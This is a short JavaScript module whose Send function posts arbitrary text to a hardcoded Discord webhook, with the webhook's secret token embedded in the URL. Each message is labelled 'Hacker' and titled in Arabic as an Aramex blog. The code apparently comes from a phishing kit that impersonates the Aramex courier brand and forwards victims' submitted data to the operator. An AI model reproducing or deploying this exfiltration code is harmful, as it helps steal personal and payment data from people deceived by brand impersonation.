import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327726267029655683/LeUlBcLFuY_B3OjV_F1DDSI1X-2PCkdzY4sFWp5_W2_dlE4q759asyA9jSONWc8l2eWn",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
